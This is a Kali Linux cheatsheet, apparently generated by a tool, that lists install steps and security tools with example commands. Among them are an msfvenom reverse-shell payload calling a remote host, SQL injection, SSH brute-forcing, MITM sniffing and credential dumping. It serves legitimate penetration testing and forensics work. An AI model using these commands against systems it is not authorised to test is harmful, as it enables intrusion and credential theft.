---
title: Kali Linux
category: platform
docs_url: https://www.kali.org/docs/
created: "2026-05-10"
tags: [security, pentesting, linux, osint, kali]
---

# Kali Linux Cheatsheet

> Debian-based Linux distribution designed for digital forensics and penetration testing. Pre-loaded with 600+ security tools.

**Official Docs:** https://www.kali.org/docs/  
**Platform(s):** x86, ARM, VMware, VirtualBox, Docker, WSL, cloud

---

## Installation

### ISO / Bare Metal
```bash
# Download from https://www.kali.org/get-kali/
# Create bootable USB
dd if=kali-linux-2024.3-live-amd64.iso of=/dev/sdX bs=4M status=progress
```

### VMware / VirtualBox
- Download pre-built VM from https://www.kali.org/get-kali/#kali-virtual-machines
- Import OVA into hypervisor

### Docker
```bash
docker pull kalilinux/kali-rolling
docker run -it kalilinux/kali-rolling /bin/bash

# With full toolset
docker run -it kalilinux/kali-rolling apt update && apt install -y kali-linux-headless
```

### WSL
```powershell
wsl --install -d kali-linux
# or from Microsoft Store
```

### Verify
```bash
uname -a
cat /etc/os-release
```

---

## Setup

### Default credentials (pre-built VMs)
```
Username: kali
Password: kali
```

### Change password
```bash
passwd
```

### Update
```bash
sudo apt update && sudo apt full-upgrade -y
```

### Enable root
```bash
sudo su -
passwd  # Set root password
```

---

## Tool Categories

### Information Gathering
| Tool | Purpose | Example |
|------|---------|---------|
| `nmap` | Network scanner | `nmap -sV -sC -O 192.168.1.1` |
| `masscan` | Mass IP scanner | `masscan -p1-65535 10.0.0.0/8` |
| `recon-ng` | Web reconnaissance framework | `recon-ng` |
| `theHarvester` | Email/subdomain harvesting | `theHarvester -d example.com -b all` |
| `maltego` | Link analysis / OSINT | `maltego` |
| `dmitry` | Deepmagic info gathering | `dmitry -winsepfbo example.com` |
| `ike-scan` | VPN fingerprinting | `ike-scan 192.168.1.1` |

### Vulnerability Scanning
| Tool | Purpose | Example |
|------|---------|---------|
| `nikto` | Web vulnerability scanner | `nikto -h http://target.com` |
| `openvas` | Full vulnerability scanner | `openvas-start` |
| `nessus` | Commercial vuln scanner (install separately) |

### Web Application
| Tool | Purpose | Example |
|------|---------|---------|
| `burpsuite` | Web proxy / scanner | `burpsuite` |
| `sqlmap` | SQL injection automation | `sqlmap -u "http://target.com?id=1" --dbs` |
| `dirb` | Directory brute-force | `dirb http://target.com /usr/share/wordlists/dirb/common.txt` |
| `gobuster` | Directory/DNS/VHost brute | `gobuster dir -u http://target.com -w wordlist.txt` |
| `wfuzz` | Web fuzzer | `wfuzz -c -z file,wordlist.txt http://target.com/FUZZ` |
| `wpscan` | WordPress scanner | `wpscan --url http://target.com` |
| `commix` | Command injection | `commix -u "http://target.com/cmd.php"` |

### Exploitation
| Tool | Purpose | Example |
|------|---------|---------|
| `metasploit` | Exploitation framework | `msfconsole` |
| `msfvenom` | Payload generator | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o shell` |
| `searchsploit` | Exploit database search | `searchsploit apache 2.4` |
| `beef-xss` | Browser exploitation | `beef-xss` |
| `setoolkit` | Social engineering toolkit | `setoolkit` |

### Post-Exploitation
| Tool | Purpose | Example |
|------|---------|---------|
| `mimikatz` | Credential dumping | `mimikatz.exe` (Windows target) |
| `powersploit` | PowerShell post-exploitation |
| ` Empire` | PowerShell agent framework | `powershell-empire` |

### Wireless
| Tool | Purpose | Example |
|------|---------|---------|
| `aircrack-ng` | WEP/WPA cracking | `aircrack-ng capture.cap` |
| `wifite` | Automated wireless audit | `wifite` |
| `reaver` | WPS PIN attack | `reaver -i wlan0mon -b 00:11:22:33:44:55` |
| `kismet` | Wireless network detector | `kismet` |

### Forensics
| Tool | Purpose | Example |
|------|---------|---------|
| `autopsy` | Digital forensics platform | `autopsy` |
| `sleuthkit` | File system analysis | `fls -r image.raw` |
| `foremost` | File carving | `foremost -i image.raw` |
| `bulk_extractor` | Fast feature extraction | `bulk_extractor -o out image.raw` |
| `volatility` | Memory forensics | `volatility -f memory.dmp imageinfo` |

### Sniffing / Spoofing
| Tool | Purpose | Example |
|------|---------|---------|
| `wireshark` | Network protocol analyzer | `wireshark` |
| `tcpdump` | CLI packet capture | `tcpdump -i eth0 -w capture.pcap` |
| `ettercap` | MITM attack tool | `ettercap -T -q -i eth0` |
| `ettercap-graphical` | GUI version |
| `bettercap` | Modern MITM framework | `bettercap -iface eth0` |
| `dsniff` | Password sniffing | `dsniff -i eth0` |

### Reverse Engineering
| Tool | Purpose | Example |
|------|---------|---------|
| `ghidra` | NSA SRE framework | `ghidra` |
| `radare2` | CLI reverse engineering | `r2 -A /bin/ls` |
| `cutter` | GUI for radare2 | `cutter` |
| `edb-debugger` | GUI debugger | `edb` |
| `valgrind` | Memory debugging | `valgrind --leak-check=full ./program` |

### Password Attacks
| Tool | Purpose | Example |
|------|---------|---------|
| `john` | John the Ripper | `john --wordlist=wordlist.txt hashfile` |
| `hashcat` | GPU password cracker | `hashcat -m 0 hashfile wordlist.txt` |
| `hydra` | Online password brute | `hydra -l admin -P wordlist.txt ssh://target` |
| `medusa` | Speedy brute forcer | `medusa -h target -u admin -P pass.txt -M ssh` |
| `crunch` | Wordlist generator | `crunch 8 12 abc123 -o wordlist.txt` |

---

## Tips

- **Wordlists:** `/usr/share/wordlists/` — rockyou.txt, dirb, seclists, wfuzz, nmap.
- **Update everything:** `sudo apt update && sudo apt full-upgrade && sudo apt autoremove` weekly.
- **Non-root tool usage:** Some tools require root (nmap OS detection, aircrack). Use `sudo`.
- **VPN during testing:** Always route through a VPN or sanctioned test network.
- **Documentation:** Take notes with CherryTree, Dradis, or keepnote installed by default.
- **Custom ISO:** Build a custom Kali ISO with `kali-linux-everything` metapackage for all tools.
- **Metapackages:** `kali-linux-headless` (CLI), `kali-linux-default` (common GUI), `kali-linux-everything` (all).

---
*Generated via cheatsheet skill on 2026-05-10*
